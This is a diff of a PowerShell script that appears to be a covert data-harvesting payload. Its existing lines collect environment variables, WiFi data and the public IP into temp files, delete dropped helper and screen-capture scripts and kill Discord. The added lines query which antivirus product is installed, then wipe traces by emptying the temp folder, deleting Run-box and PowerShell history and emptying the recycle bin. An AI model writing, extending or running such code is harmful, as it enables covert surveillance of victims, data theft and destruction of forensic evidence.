@@ -46,6 +46,9 @@ echo "" > "$env:temp\WIFI-$namepc.txt";
 
 # Get PC information
   dir env: >> "$env:temp\stats-$namepc.txt";
+# List which AntiVirus Product is being used
+  echo "Installed Software:" >> "$env:temp\stats-$namepc.txt";
+  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct >> "$env:temp\stats-$namepc.txt";
 # Get public IP
   $pubip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/").Content
   echo "PUBLIC IP: $pubip" >> "$env:temp\stats-$namepc.txt";
@@ -83,6 +86,18 @@ cd $env:temp
   Remove-Item  $env:temp\p.ps1 -Force -Recurse;
 # Delete screencapture script
   Remove-Item $env:temp\d.ps1 -Force -Recurse;
+
+# 1empty temp folder
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# 1delete run box history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+
+# 1Delete powershell history
+Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+# 1Empty recycle bin
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 #Last discord kill before quit
 taskkill /IM Discord.exe /F
